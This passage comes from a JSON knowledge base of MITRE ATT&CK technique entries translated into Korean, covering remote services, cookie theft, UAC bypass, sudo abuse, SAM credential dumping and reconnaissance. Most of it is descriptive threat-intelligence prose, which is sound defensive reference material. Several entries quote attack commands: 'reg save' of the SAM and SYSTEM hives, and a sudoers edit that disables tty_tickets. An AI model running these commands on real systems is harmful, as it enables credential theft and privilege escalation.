    "description": "적대자들은 외부에서 접근 가능한 원격 서비스를 활용하여 네트워크에 처음 접근하거나 지속적으로 남아 있을 수 있습니다. VPN, Citrix와 같은 원격 서비스는 사용자들이 외부 위치에서 내부 기업 네트워크 자원에 연결할 수 있도록 합니다. 이러한 서비스의 연결 및 자격 증명 인증을 관리하는 원격 서비스 게이트웨이가 종종 존재합니다. Windows 원격 관리 및 VNC와 같은 서비스도 외부에서 사용할 수 있습니다.\n\n서비스를 사용하기 위해서는 유효한 계정에 대한 접근이 종종 요구되며, 이는 자격 증명 파밍을 통해 얻거나 기업 네트워크를 해킹한 후 사용자의 자격 증명을 획득하여 이루어질 수 있습니다. 원격 서비스에 대한 접근은 작업 중 중복 또는 지속적인 접근 메커니즘으로 사용될 수 있습니다.\n\n인증을 요구하지 않는 노출된 서비스를 통해서도 접근이 가능할 수 있습니다. 컨테이너화된 환경에서는 노출된 Docker API, Kubernetes API 서버, kubelet 또는 Kubernetes 대시보드와 같은 웹 애플리케이션이 포함될 수 있습니다.",
    "external_id": "T1133",
    "modified": "2023-03-30T21:01:36.318Z",
    "translated": true
  },
  {
    "title": "LC_LOAD_DYLIB Addition",
    "description": "적대자는 오염된 바이너리의 실행으로 촉발된 악성 콘텐츠를 실행함으로써 지속성을 확립할 수 있습니다. Mach-O 바이너리는 바이너리가 로드될 때 특정 작업을 수행하기 위해 사용되는 일련의 헤더를 가지고 있습니다. Mach-O 바이너리의 LC_LOAD_DYLIB 헤더는 macOS와 OS X에 실행 시간에 로드할 동적 라이브러리(dylibs)를 알려줍니다. 이러한 라이브러리는 나머지 필드와 종속성에 대한 조정이 이루어질 경우 컴파일된 바이너리에 임의로 추가될 수 있습니다. 도구를 사용하여 이러한 변경을 수행할 수 있습니다.\n\n적대자는 Mach-O 바이너리 헤더를 수정하여 바이너리가 실행될 때마다 악성 dylibs를 로드하고 실행할 수 있습니다. 바이너리가 수정되기 때문에 변경 사항은 바이너리에 대한 디지털 서명을 무효화하지만, LC_CODE_SIGNATURE 명령을 바이너리에서 제거하여 서명이 로드 시 확인되지 않도록 함으로써 이를 완화할 수 있습니다.",
    "external_id": "T1546.006",
    "modified": "2022-04-20T17:08:21.101Z",
    "translated": true
  },
  {
    "title": "Steal Web Session Cookie",
    "description": "적대자는 웹 애플리케이션 또는 서비스 세션 쿠키를 훔쳐 이를 사용하여 인증된 사용자로서 웹 애플리케이션이나 인터넷 서비스에 접근할 수 있습니다. 웹 애플리케이션과 서비스는 일반적으로 사용자가 웹사이트에 인증한 후 인증 토큰으로 세션 쿠키를 사용합니다.\n\n쿠키는 웹 애플리케이션이 적극적으로 사용되지 않더라도 장기간 유효할 수 있습니다. 쿠키는 디스크, 브라우저의 프로세스 메모리 및 원격 시스템으로의 네트워크 트래픽에서 발견될 수 있습니다. 또한, 대상 시스템의 다른 애플리케이션이 민감한 인증 쿠키를 메모리에 저장할 수 있습니다. 세션 쿠키는 일부 다중 요소 인증 프로토콜을 우회하는 데 사용될 수 있습니다.\n\n로컬 시스템의 웹 브라우저에서 쿠키를 대상으로 하는 여러 가지 악성 소프트웨어의 예가 있습니다. 적대자는 또한 웹사이트에 악성 JavaScript 콘텐츠를 주입하거나 피해자를 속여 브라우저에서 악성 JavaScript를 실행하도록 유도하여 쿠키를 훔칠 수 있습니다.\n\n'Evilginx2' 및 'Muraena'와 같은 오픈 소스 프레임워크도 있어, 적대자가 설정한 악성 프록시를 통해 세션 쿠키를 수집할 수 있으며, 이는 피싱 캠페인에서 사용될 수 있습니다.\n\n적대자가 유효한 쿠키를 획득한 후, 해당 웹 애플리케이션에 로그인하기 위해 웹 세션 쿠키 기법을 수행할 수 있습니다.",
    "external_id": "T1539",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Container Orchestration Job",
    "description": "적대자는 Kubernetes와 같은 컨테이너 오케스트레이션 도구가 제공하는 작업 스케줄링 기능을 악용하여 악성 코드를 실행하도록 구성된 컨테이너의 배치를 예약할 수 있습니다. 컨테이너 오케스트레이션 작업은 이러한 자동화된 작업을 특정 날짜와 시간에 실행하며, 이는 Linux 시스템의 크론 작업과 유사합니다. 이러한 유형의 배치는 시간이 지나도 컨테이너의 수를 유지하도록 구성할 수 있어 클러스터 내에서 지속성을 유지하는 과정을 자동화합니다.\n\nKubernetes에서는 CronJob을 사용하여 특정 작업을 수행하기 위해 하나 이상의 컨테이너를 실행하는 Job을 예약할 수 있습니다. 따라서 적대자는 CronJob을 활용하여 클러스터 내의 여러 노드에서 악성 코드를 실행하는 Job의 배치를 예약할 수 있습니다.",
    "external_id": "T1053.007",
    "modified": "2024-10-15T16:26:03.731Z",
    "translated": true
  },
  {
    "title": "Domain Generation Algorithms",
    "description": "적대자들은 도메인 생성 알고리즘(DGA)을 사용하여 정적 IP 주소나 도메인 목록에 의존하는 대신, 명령 및 제어 트래픽을 위한 목적지 도메인을 동적으로 식별할 수 있습니다. 이는 방어자가 명령 및 제어 채널을 차단, 추적 또는 장악하는 것을 훨씬 더 어렵게 만들며, 악성 코드가 지침을 확인할 수 있는 수천 개의 도메인이 있을 수 있습니다.\n\nDGA는 각 문자를 생성하여 도메인 이름을 구성할 때 명백히 무작위이거나 \"잡다한\" 문자열의 형태를 취할 수 있습니다. 또는 일부 DGA는 문자가 아닌 단어를 연결하여 전체 단어를 단위로 사용합니다. 많은 DGA는 시간 기반으로 작동하여 각 시간 주기(매시간, 매일, 매월 등)에 대해 서로 다른 도메인을 생성합니다. 다른 DGA는 예측을 더욱 어렵게 만들기 위해 종자 값을 포함하기도 합니다.\n\n적대자들은 [대체 채널]의 목적으로 DGA를 사용할 수 있습니다. 주요 명령 및 제어 서버와의 접촉이 끊어지면, 악성 코드는 명령 및 제어를 재설립하는 수단으로 DGA를 사용할 수 있습니다.",
    "external_id": "T1568.002",
    "modified": "2024-10-15T15:55:16.111Z",
    "translated": true
  },
  {
    "title": "Double File Extension",
    "description": "적대자는 파일 이름에 이중 확장을 악용하여 진짜 파일 유형을 가장하는 수단으로 사용할 수 있습니다. 파일 이름은 보조 파일 유형 확장을 포함할 수 있으며, 이 경우 첫 번째 확장자만 표시됩니다. 그러나 두 번째 확장이 실제 파일 유형으로, 파일이 어떻게 열리고 실행되는지를 결정합니다. 실제 파일 확장은 파일 브라우저에서 운영 체제에 의해 숨겨질 수 있으며, 시스템 정책을 사용하거나 유사하게 구성된 소프트웨어에서도 마찬가지입니다.\n\n적대자는 이중 확장을 악용하여 페이로드의 위험한 파일 유형을 은폐하려 할 수 있습니다. 일반적인 사용 예는 사용자가 무해한 파일 유형으로 생각하는 파일을 열도록 속이는 것입니다. 이러한 파일은 종종 이메일 첨부 파일인 척하며, 적대자가 사용자의 시스템에 초기 접근을 얻도록 합니다. 예를 들어, <code>Evil.txt.exe</code>라는 실행 파일 첨부 파일은 사용자에게 <code>Evil.txt</code>로 표시될 수 있습니다. 사용자는 이를 무해한 텍스트 파일로 보고 열게 되어, 의도치 않게 숨겨진 악성 코드를 실행하게 됩니다.\n\n일반적으로 사용되는 파일 유형인 텍스트 파일(.txt, .doc 등)과 이미지 파일(.jpg, .gif 등)은 보통 첫 번째 확장자로 사용되어 무해해 보이게 합니다. 위험한 것으로 간주되는 실행 파일 확장자(.exe, .lnk, .hta, .scr 등)는 종종 두 번째 확장자이자 실제 파일 유형으로 나타납니다.",
    "external_id": "T1036.007",
    "modified": "2021-10-14T21:09:59.588Z",
    "translated": true
  },
  {
    "title": "Bypass User Account Control",
    "description": "적대자는 UAC 메커니즘을 우회하여 시스템의 프로세스 권한을 상승시킬 수 있습니다. Windows 사용자 계정 컨트롤(UAC)은 프로그램이 관리자 수준의 권한으로 작업을 수행하기 위해 자신의 권한을 승격할 수 있게 해주며, 이는 종종 사용자에게 확인을 요청하는 방식으로 이루어집니다. 사용자에게 미치는 영향은 높은 강제 적용 하에서 작업을 거부하는 것부터, 로컬 관리자 그룹에 속해 있는 사용자가 프롬프트를 클릭하거나 관리자 비밀번호를 입력하여 작업을 완료할 수 있는 경우까지 다양합니다.\n\n컴퓨터의 UAC 보호 수준이 최고 수준이 아닌 다른 수준으로 설정되어 있으면, 특정 Windows 프로그램이 UAC 알림 창을 통해 사용자에게 요청하지 않고 권한을 상승시키거나 일부 고급 개체를 실행할 수 있습니다. 특정 DLL을 로드하여 자동으로 권한을 상승시키는 개체를 로드하고, 일반적으로 상승된 접근이 필요한 보호된 디렉토리에서 파일 작업을 수행하는 예로는 Rundll32의 사용이 있습니다. 악성 소프트웨어가 신뢰받는 프로세스에 주입되어 사용자에게 요청 없이 권한을 상승시킬 수도 있습니다.\n\nUAC를 우회하는 방법은 여러 가지가 발견되었습니다. UACME의 GitHub 리드미 페이지에는 발견되고 구현된 방법들에 대한 방대한 목록이 포함되어 있지만, 이는 우회 방법의 포괄적인 목록이 아닐 수 있습니다. 추가적인 우회 방법은 정기적으로 발견되며, 실제로 사용되는 것들도 있습니다.\n\n일례로, eventvwr.exe는 자동으로 권한을 상승시키고 지정된 이진 파일이나 스크립트를 실행할 수 있습니다.\n\n또 다른 우회는 관리자 권한을 가진 계정의 자격 증명이 알려져 있을 경우 일부 측면 이동 기술을 통해 가능하며, UAC는 단일 시스템 보안 메커니즘이기 때문에 한 시스템에서 실행되는 프로세스의 권한이나 무결성이 원격 시스템에서는 알 수 없으며 기본적으로 높은 무결성으로 설정됩니다.",
    "external_id": "T1548.002",
    "modified": "2023-04-21T12:35:39.112Z",
    "translated": true
  },
  {
    "title": "Internet Connection Discovery",
    "description": "적대자는 compromised 시스템에서 인터넷 연결을 검사할 수 있습니다. 이는 자동화된 탐색 중에 수행될 수 있으며, Ping, tracert 및 웹사이트에 대한 GET 요청과 같은 다양한 방법으로 이루어질 수 있습니다.\n\n적대자는 이러한 요청의 결과와 응답을 사용하여 시스템이 C2 서버와 통신할 수 있는지를 판단하고 연결을 시도하기 전에 확인할 수 있습니다. 결과는 또한 경로, 리다이렉터 및 프록시 서버를 식별하는 데 사용할 수 있습니다.",
    "external_id": "T1016.001",
    "modified": "2021-03-25T17:03:26.632Z",
    "translated": true
  },
  {
    "title": "Sudo and Sudo Caching",
    "description": "적대자는 sudo 캐싱을 수행하거나 sudoers 파일을 사용하여 권한을 상승시킬 수 있습니다. 적대자는 이를 통해 다른 사용자로 명령을 실행하거나 더 높은 권한으로 프로세스를 생성할 수 있습니다.\n\nLinux 및 MacOS 시스템 내에서 sudo(때때로 \"superuser do\"라고 불림)는 사용자가 터미널에서 권한이 상승된 명령을 수행하고 이러한 명령을 시스템에서 수행할 수 있는 사용자를 제어할 수 있도록 합니다. sudo 명령은 \"시스템 관리자가 특정 사용자(또는 사용자 그룹)에게 루트 또는 다른 사용자로서 일부(또는 모든) 명령을 실행할 수 있는 권한을 위임하고, 명령과 해당 인수의 감사 기록을 제공할 수 있도록 합니다.\" 시스템 관리자를 위해 만들어졌기 때문에 sudo는 유용한 구성 기능을 가지고 있습니다. 예를 들어, password를 다시 요청하기 전 sudo 인스턴스 간의 시간 (분 단위)을 정의하는 timestamp_timeout이 있습니다. 이는 sudo가 일정 기간 동안 자격 증명을 캐시할 수 있기 때문입니다. Sudo는 마지막으로 sudo가 실행된 시간을 기록한 타임스탬프와 함께 /var/db/sudo에 파일을 생성(또는 수정)합니다. 추가로, tty_tickets 변수는 각 새로운 tty(터미널 세션)를 독립적으로 취급합니다. 이는 예를 들어, 한 tty의 sudo 타임아웃이 다른 tty에 영향을 미치지 않는다는 의미입니다(다시 password를 입력해야 합니다).\n\nsudoers 파일인 /etc/sudoers는 어떤 사용자가 어떤 명령을 실행할 수 있는지를 설명하고, 어떤 터미널에서 실행할 수 있는지를 설명합니다. 또한 사용자들이 다른 사용자나 그룹으로 어떤 명령을 실행할 수 있는지를 기술합니다. 이는 사용자들이 대부분의 시간 동안 최소 권한으로 작업하고 필요할 때만 다른 사용자나 권한을 상승시키도록 하는 최소 권한 원칙을 제공합니다. 일반적으로 password를 요청받음으로써 이루어집니다. 그러나 sudoers 파일은 user1 ALL=(ALL) NOPASSWD: ALL과 같은 라인을 사용하여 사용자에게 password를 요청하지 않도록 할 수도 있습니다. 그러나 이 파일을 수정하려면 상승된 권한이 필요합니다.\n\n적대자는 사용자 password 없이 권한을 상승시키기 위해 이러한 메커니즘의 잘못된 구성을 악용할 수 있습니다. 예를 들어, /var/db/sudo의 타임스탬프를 모니터링하여 timestamp_timeout 범위 내에 있는지를 확인할 수 있습니다. 만약 그렇다면, 악성 코드는 사용자 password를 제공하지 않고도 sudo 명령을 실행할 수 있습니다. 추가로, tty_tickets가 비활성화된 경우 적대자는 해당 사용자에서 어떤 tty에서도 이를 수행할 수 있습니다.\n\n현실 세계에서 악성 코드는 tty_tickets를 비활성화하여 스크립팅을 더 쉽게 만들기 위해 echo 'Defaults !tty_tickets' >> /etc/sudoers 명령을 발행했습니다. 이 변경 사항이 반영되기 위해 악성 코드는 killall Terminal 명령도 발행했습니다. macOS Sierra부터 sudoers 파일은 기본적으로 tty_tickets가 활성화되어 있습니다.",
    "external_id": "T1548.003",
    "modified": "2022-03-14T16:28:19.781Z",
    "translated": true
  },
  {
    "title": "Archive via Custom Method",
    "description": "적대적 행위자는 외부 유틸리티나 라이브러리 참조 없이 구현된 XOR 또는 스트림 암호화를 사용하여 데이터를 압축하거나 암호화하여 유출 전 데이터를 수집할 수 있습니다. 잘 알려진 압축 알고리즘의 커스텀 구현도 사용되었습니다.",
    "external_id": "T1560.003",
    "modified": "2020-03-25T22:48:14.605Z",
    "translated": true
  },
  {
    "title": "Modify Cloud Compute Infrastructure",
    "description": "적대자는 방어를 피하기 위해 클라우드 계정의 컴퓨트 서비스 인프라를 수정하려고 시도할 수 있습니다. 컴퓨트 서비스 인프라의 수정은 컴퓨트 인스턴스, 가상 머신 및 스냅샷과 같은 하나 이상의 구성 요소의 생성, 삭제 또는 수정이 포함될 수 있습니다.\n\n인프라 구성 요소 수정으로 얻은 권한은 기존 인프라에 대한 접근을 방지하는 제한 사항을 우회할 수 있습니다. 인프라 구성 요소를 수정하는 것은 적대자가 탐지를 피하고 자신의 존재에 대한 증거를 제거할 수 있게 할 수도 있습니다.",
    "external_id": "T1578",
    "modified": "2024-09-30T13:28:37.414Z",
    "translated": true
  },
  {
    "title": "Network Devices",
    "description": "적대자들은 목표 설정 중에 사용할 수 있는 제3자 네트워크 장비를 손상시킬 수 있습니다. 소형 사무실/홈 오피스(SOHO) 라우터와 같은 네트워크 장비가 손상될 수 있으며, 적대자의 궁극적인 목표는 해당 환경에 대한 초기 액세스가 아니라 이러한 장비를 활용하여 추가적인 목표를 지원하는 것입니다.\n\n적대자가 통제권을 가지게 되면 손상된 네트워크 장비는 피싱 캠페인을 위한 페이로드 호스팅 또는 콘텐츠 주입 작업을 실행하기 위한 필수 액세스를 제공하는 등 추가 작업을 시작하는 데 사용할 수 있습니다. 적대자는 또한 손상된 네트워크 장비에서 재사용 가능한 자격 증명을 수집할 수 있습니다.\n\n적대자들은 종종 인터넷에 노출된 엣지 장비 및 관련 네트워크 장치를 표적으로 삼으며, 이들 장치는 특히 강력한 호스트 기반 방어를 지원하지 않는 경우가 많습니다.\n\n손상된 네트워크 장치는 이후의 명령 및 제어 활동을 지원하는 데 사용될 수 있으며, 확립된 프록시를 통한 인프라 숨기기 및/또는 봇넷 네트워크를 통한 활동을 포함할 수 있습니다.",
    "external_id": "T1584.008",
    "modified": "2024-10-15T15:10:59.530Z",
    "translated": true
  },
  {
    "title": "Malvertising",
    "description": "적대자들은 온라인 광고를 구매하여 피해자에게 악성 코드를 배포하는 데 악용할 수 있습니다. 광고는 특정 위치에 유리하게 배치된 아티팩트를 심거나 배포하기 위해 구매될 수 있으며, 예를 들어 검색 엔진 결과에서 두드러지게 표시되는 경우가 있습니다. 이러한 광고는 사용자가 실제 검색 결과와 광고를 구분하기 더 어렵게 만들 수 있습니다. 구매된 광고는 또한 광고 네트워크의 기능을 활용하여 특정 대상을 겨냥할 수 있으며, 이는 검색 엔진과 인기 웹사이트에 본래 부여된 신뢰를 추가로 이용할 수 있습니다.\n\n적대자들은 광고 및 기타 자원을 구매하여 악성 코드를 포함하는 아티팩트를 피해자에게 배포하는 데 도움을 줄 수 있습니다. 구매된 광고는 잘 알려진 브랜드를 사칭하거나 위조하려 시도할 수 있습니다. 예를 들어, 이러한 위조된 광고는 피해자를 클릭하도록 유도할 수 있으며, 이로 인해 피해자는 공식 웹사이트의 트로이 악성 소프트웨어 버전이 포함된 악성 도메인으로 이동하게 될 수 있습니다. 적대자가 악성 도메인을 만들고 광고를 구매하려는 노력은 청소 작업에 더 잘 저항하기 위해 자동화될 수도 있습니다.\n\n악성 광고는 사용자로부터 제한된 상호작용이 필요할 수 있는 드라이브 바이 타겟과 드라이브 바이 컴프라미스 공격을 지원하는 데 사용될 수 있으며, 이 경우 광고에 포함된 코드나 취약점이 대상 시스템의 웹 브라우저를 감염시킬 수 있습니다.\n\n적대자들은 광고 네트워크의 탐지를 피하기 위해 여러 기술을 사용할 수 있습니다. 예를 들어, 적대자들은 광고 클릭을 동적으로 라우팅하여 자동화된 크롤러나 정책 집행 트래픽을 무해한 사이트로 보내면서 잠재적 대상을 검증한 후 실제 광고 클릭에서 유도된 피해자를 악성 페이지로 보낼 수 있습니다. 따라서 이 감염 경로는 광고 네트워크와 유효한 식별자를 클릭하여 악성 사이트에 도달하지 않는 방문자에게 숨겨질 수 있습니다. 브랜드 평판 모니터링을 피하기 위해 의도적인 오타와 같은 다른 수법도 자동 탐지를 회피하는 데 사용될 수 있습니다.",
    "external_id": "T1583.008",
    "modified": "2024-10-16T20:10:08.246Z",
    "translated": true
  },
  {
    "title": "Permission Groups Discovery",
    "description": "적대자는 그룹 및 권한 설정을 파악하려고 시도할 수 있습니다. 이 정보는 적대자가 사용 가능한 사용자 계정 및 그룹, 특정 그룹의 사용자 구성원 및 권한이 상승된 사용자 및 그룹에 대한 정보를 결정하는 데 도움이 될 수 있습니다.\n\n적대자는 여러 가지 방법으로 그룹 권한 설정을 발견하려고 할 수 있습니다. 이 데이터는 적대자에게 침해된 환경에 대한 정보를 제공하여 후속 활동 및 타겟팅에 사용될 수 있습니다.",
    "external_id": "T1069",
    "modified": "2024-10-15T16:03:06.294Z",
    "translated": true
  },
  {
    "title": "Email Collection",
    "description": "적대자들은 사용자의 이메일을 타겟으로 하여 민감한 정보를 수집할 수 있습니다. 이메일에는 적대자들에게 가치가 있을 수 있는 영업 비밀이나 개인 정보와 같은 민감한 데이터가 포함될 수 있습니다. 이메일에는 진행 중인 사고 대응 작업에 대한 세부 정보도 포함되어 있어, 적대자들이 기술을 조정하여 지속성을 유지하거나 방어를 회피할 수 있는 가능성을 제공합니다. 적대자들은 메일 서버나 클라이언트에서 이메일을 수집하거나 전달할 수 있습니다.",
    "external_id": "T1114",
    "modified": "2024-10-15T12:24:27.627Z",
    "translated": true
  },
  {
    "title": "Security Account Manager",
    "description": "적대자는 메모리 내 기법이나 SAM 데이터베이스가 저장된 Windows 레지스트리를 통해 보안 계정 관리자(SAM) 데이터베이스에서 자격 증명 자료를 추출하려고 시도할 수 있습니다. SAM은 호스트의 로컬 계정을 포함하는 데이터베이스 파일로, 일반적으로 <code>net user</code> 명령어로 확인할 수 있는 계정입니다. SAM 데이터베이스를 열거하려면 SYSTEM 수준의 접근이 필요합니다.\n\n메모리 내 기법을 통해 SAM 파일을 검색하는 데 사용할 수 있는 여러 도구가 있습니다:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\n또한, Reg를 사용하여 레지스트리에서 SAM을 추출할 수 있습니다:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n그 후 Creddump7을 사용하여 SAM 데이터베이스를 로컬에서 처리하여 해시를 추출할 수 있습니다.\n\n노트:\n\n* RID 500 계정은 로컬 내장 관리자입니다.\n* RID 501은 게스트 계정입니다.\n* 사용자 계정은 RID가 1,000 이상으로 시작합니다.",
    "external_id": "T1003.002",
    "modified": "2024-10-15T16:40:52.174Z",
    "translated": true
  },
  {
    "title": "WHOIS",
    "description": "적대자들은 공격 목표에 사용할 수 있는 피해자에 대한 정보를 찾기 위해 공개 WHOIS 데이터를 검색할 수 있습니다. WHOIS 데이터는 도메인 이름과 같은 인터넷 자원을 할당하고 배분하는 역할을 하는 지역 인터넷 등록 기관(RIR)에 의해 저장됩니다. 누구나 등록된 도메인에 대한 정보, 예를 들어 할당된 IP 블록, 연락처 정보 및 DNS 네임서버에 대한 정보를 위해 WHOIS 서버에 질의할 수 있습니다.\n\n적대자들은 실행 가능한 정보를 수집하기 위해 WHOIS 데이터를 검색할 수 있습니다. 위협 행위자들은 온라인 리소스나 명령줄 유틸리티를 사용하여 잠재적인 피해자에 대한 정보를 찾기 위해 WHOIS 데이터를 샅샅이 훑을 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회(예: 적극적 스캐닝 또는 정보 피싱), 운영 리소스 구축(예: 인프라 획득 또는 인프라 손상), 그리고/또는 초기 접근(예: 외부 원격 서비스 또는 신뢰 관계)을 확립하는 데 도움이 될 수 있습니다.",
    "external_id": "T1596.002",
    "modified": "2021-04-15T03:50:44.113Z",
    "translated": true
  },
  {
    "title": "System Firmware",
    "description": "적대자는 시스템 펌웨어를 수정하여 시스템에 지속적으로 존재할 수 있습니다. BIOS(기본 입출력 시스템)와 통합 확장 펌웨어 인터페이스(UEFI) 또는 확장 펌웨어 인터페이스(EFI)는 운영 체제와 컴퓨터 하드웨어 간의 소프트웨어 인터페이스로 작동하는 시스템 펌웨어의 예입니다.\n\nBIOS 및 (U)EFI와 같은 시스템 펌웨어는 컴퓨터의 기능을 뒷받침하며, 적대자가 악의적인 활동을 수행하거나 보조하기 위해 수정할 수 있습니다. 시스템 펌웨어를 덮어쓸 수 있는 기능이 존재하여, 정교한 적대자는 시스템에서 감지하기 어려운 방법으로 악의적인 펌웨어 업데이트를 설치할 수 있는 수단을 가질 수 있습니다.",
    "external_id": "T1542.001",
    "modified": "2024-04-16T12:21:51.311Z",
    "translated": true
  },
  {
    "title": "Search Victim-Owned Websites",
    "description": "적대자는 피해자가 소유한 웹사이트를 검색하여 타겟팅에 사용할 수 있는 정보를 찾을 수 있습니다. 피해자 소유의 웹사이트에는 부서나 분과의 이름, 물리적 위치, 주요 직원에 대한 데이터(예: 이름, 역할, 연락처 정보)와 같은 다양한 세부정보가 포함될 수 있습니다. 이러한 사이트는 또한 비즈니스 운영 및 관계를 강조하는 세부정보를 포함할 수 있습니다.\n\n적대자는 피해자가 소유한 웹사이트를 검색하여 실행 가능한 정보를 수집할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 최초 접근을 수립하는 데 도움이 될 수 있습니다.\n\n웹사이트를 수동으로 탐색하는 것 외에도, 적대자는 추가적인 민감한 정보나 취약한 기능이 포함될 수 있는 숨겨진 디렉토리나 파일을 식별하려고 시도할 수 있습니다. 그들은 자동화된 활동을 통해 이러한 작업을 수행할 수 있으며, sitemap.xml 및 robots.txt와 같은 파일을 활용할 수 있습니다.",
    "external_id": "T1594",
    "modified": "2024-10-02T18:52:21.278Z",
    "translated": true
  },
  {
    "title": "Cloud Groups",
    "description": "적대자는 클라우드 그룹 및 권한 설정을 찾으려고 할 수 있습니다. 클라우드 권한 그룹에 대한 지식은 적대자가 환경 내 사용자 및 그룹의 특정 역할과 특정 그룹에 연결된 사용자를 결정하는 데 도움을 줄 수 있습니다.\n\n인증된 접근 권한이 있을 경우, 권한 그룹을 찾기 위해 사용할 수 있는 여러 도구가 있습니다. PowerShell cmdlet인 `Get-MsolRole`은 Exchange 및 Office 365 계정의 역할 및 권한 그룹을 얻는 데 사용될 수 있습니다.\n\nAzure CLI와 Google Cloud Identity Provider API 또한 권한 그룹을 얻기 위한 인터페이스를 제공합니다. Azure의 경우, `az ad user get-member-groups` 명령은 사용자 계정과 연결된 그룹을 나열하며, Google의 경우, API 엔드포인트 `GET https://cloudidentity.googleapis.com/v1/groups`는 사용자에게 제공되는 그룹 자원을 나열합니다. AWS에서는 `ListRolePolicies` 및 `ListAttachedRolePolicies` 명령을 사용하여 역할에 연결된 정책을 열거할 수 있습니다.\n\n적대자는 객체에 대한 ACL을 나열하여 소유자 및 객체에 접근할 수 있는 다른 계정을 확인하려고 할 수 있습니다. 예를 들어, AWS의 `GetBucketAcl` API를 통해 이러한 정보를 얻을 수 있습니다. 이 정보를 사용하여 적대자는 특정 객체에 대한 권한이 있는 계정을 표적으로 삼거나 이미 탈취한 계정을 활용하여 객체에 접근할 수 있습니다.",
    "external_id": "T1069.003",
    "modified": "2024-10-15T15:51:35.759Z",
    "translated": true
  },
  {
    "title": "Services Registry Permissions Weakness",
    "description": "적대자들은 서비스에서 사용하는 레지스트리 항목을 탈취하여 자신의 악성 페이로드를 실행할 수 있습니다. 그들은 서비스 관련 레지스트리 키의 권한 결함을 이용해 원래 지정된 실행 파일에서 자신이 제어하는 실행 파일로 리디렉션하여 서비스가 시작될 때 자신의 코드를 실행할 수 있습니다. 윈도우는 로컬 서비스 구성 정보를 <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>에 저장합니다. 서비스의 레지스트리 키에 저장된 정보는 서비스 컨트롤러, sc.exe 또는 기타 도구를 통해 서비스의 실행 매개변수를 수정하기 위해 조작될 수 있습니다. 레지스트리 키에 대한 접근은 접근 제어 목록과 사용자 권한을 통해 제어됩니다.\n\n사용자 및 그룹에 대한 권한이 올바르게 설정되지 않고 서비스의 레지스트리 키에 대한 접근을 허용하는 경우, 적대자는 서비스의 binPath/ImagePath를 자신이 제어하는 다른 실행 파일을 가리키도록 변경할 수 있습니다. 서비스가 시작되거나 재시작될 때 적대자가 제어하는 프로그램이 실행되어, 적대자가 지속성을 구축하거나 서비스가 실행될 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService 또는 NetworkService)로 권한 상승을 할 수 있게 됩니다.\n\n적대자들은 서비스의 레지스트리 트리의 다른 레지스트리 키를 변경할 수도 있습니다. 예를 들어, <code>FailureCommand</code> 키를 변경하여 서비스가 실패하거나 고의로 손상될 때마다 서비스가 상승된 컨텍스트에서 실행되도록 할 수 있습니다.\n\n<code>Performance</code> 키는 드라이버 서비스의 성능 DLL 이름과 DLL에서 내보낸 여러 함수의 이름을 포함합니다. 만약 <code>Performance</code> 키가 이미 존재하지 않고 적대자가 제어하는 사용자가 <code>Create Subkey</code> 권한을 가지고 있다면, 적대자는 서비스의 레지스트리 트리에 악성 DLL을 가리키는 <code>Performance</code> 키를 생성할 수 있습니다.\n\n적대자들은 또한 드라이버 특정 데이터를 저장하는 <code>Parameters</code> 키를 추가하거나 자신의 악성 서비스에 대한 다른 사용자 지정 하위 키를 추가하여 지속성을 확립하거나 다른 악성 활동을 활성화할 수 있습니다. 또한, 만약 적대자들이 svchost.exe를 이용해 자신의 악성 서비스를 시작하는 경우, 서비스의 파일은 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>를 사용하여 식별할 수 있습니다.",
    "external_id": "T1574.011",
    "modified": "2024-09-12T19:42:48.016Z",
    "translated": true
  },
  {
    "title": "DNS/Passive DNS",
    "description": "적대자는 표적에 대한 정보 수집을 위해 DNS 데이터를 검색할 수 있습니다. DNS 정보에는 등록된 이름 서버뿐만 아니라 표적의 서브도메인, 메일 서버 및 기타 호스트의 주소를 설명하는 레코드를 포함한 다양한 세부 정보가 포함될 수 있습니다.\n\n적대자는 행동 가능한 정보를 수집하기 위해 DNS 데이터를 검색할 수 있습니다. 위협 행위자는 특정 조직의 이름 서버에 직접 쿼리하거나 기록된 DNS 쿼리 응답의 중앙 저장소를 검색할 수 있습니다. 적대자는 또한 내부 네트워크에 대한 정보를 드러내는 DNS 구성 오류나 유출을 찾아내고 표적할 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 확보하는 데 도움을 줄 수 있습니다.",
    "external_id": "T1596.001",
    "modified": "2021-04-15T03:49:13.409Z",
    "translated": true
  },
  {
    "title": "Application Exhaustion Flood",
    "description": "적대자는 서비스 거부(DoS)를 일으키기 위해 애플리케이션의 자원을 많이 소모하는 기능을 표적으로 삼을 수 있으며, 이는 해당 애플리케이션의 가용성을 저해할 수 있습니다. 웹 애플리케이션의 특정 기능이 고 자원 소모적일 수 있습니다. 이러한 기능에 대한 반복적인 요청은 시스템 자원을 소진시켜 애플리케이션이나 서버 자체에 대한 접근을 차단할 수 있습니다.",
    "external_id": "T1499.003",
    "modified": "2024-10-15T15:41:49.168Z",
    "translated": true
  },
  {
    "title": "Compromise Software Dependencies and Development Tools",
    "description": "적대자는 최종 소비자가 받기 전에 데이터나 시스템을 손상시키기 위해 소프트웨어 의존성과 개발 도구를 조작할 수 있습니다. 애플리케이션은 종종 올바르게 기능하기 위해 외부 소프트웨어에 의존합니다. 많은 애플리케이션에서 의존성으로 사용되는 인기 있는 오픈 소스 프로젝트는 악성 코드를 추가하는 수단으로 표적이 될 수 있습니다.\n\n표적화는 특정 피해 집단에 맞춰질 수 있거나, 넓은 소비자 집단에 분배될 수 있지만 특정 피해자에게만 추가적인 전술로 이동합니다.",
    "external_id": "T1195.001",
    "modified": "2024-04-13T14:47:31.204Z",
    "translated": true
  },
  {
    "title": "Digital Certificates",
